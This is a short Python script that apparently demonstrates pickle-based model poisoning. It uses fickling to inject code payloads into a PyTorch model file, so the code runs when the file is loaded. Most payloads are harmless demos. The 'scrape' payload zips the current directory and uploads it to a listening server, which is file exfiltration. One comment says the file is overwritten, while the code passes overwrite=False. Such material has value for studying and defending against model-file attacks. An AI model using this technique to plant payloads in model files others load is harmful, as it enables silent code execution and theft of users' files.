import argparse
from train_model import Net
from typing import Dict


examples: Dict[str, str] = {
    "minecraft": 'import os; os.system("open /Applications/Minecraft.app")',
    "helloworld": 'print("Hello World")',
    "neofetch": 'import os; os.system("neofetch")',
    "location": "import requests; print(requests.get('https://ipinfo.io').text)",
    "scrape": """python -c import os
    import requests
    import zipfile

    def zip_current_directory():
        with zipfile.ZipFile('current_dir.zip', 'w') as zipf:
            for root, dirs, files in os.walk('.'):
                for file in files:
                    zipf.write(os.path.join(root, file))

    def send_zip_file():
        zip_current_directory()
        url = "http://localhost:25565/uploadfile/"
        files = {'file': open('current_dir.zip', 'rb')}
        response = requests.post(url, files=files)
        print(response.json())

    send_zip_file()""",
}


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--pickle", type=str, help="The pickle file to load", default="mnist_cnn.pt"
    )

    parser.add_argument(
        "--example", type=str, choices=examples.keys(), default="location"
    )

    args = parser.parse_args()

    from fickling.pytorch import PyTorchModelWrapper

    # Load example PyTorch model
    model = Net()

    # Wrap model file into fickling
    result = PyTorchModelWrapper(args.pickle)

    # Inject payload, overwriting the existing file instead of creating a new one
    modified = "modified_" + args.pickle
    result.inject_payload(
        examples[args.example],
        modified,
        injection="insertion",
        overwrite=False,
    )
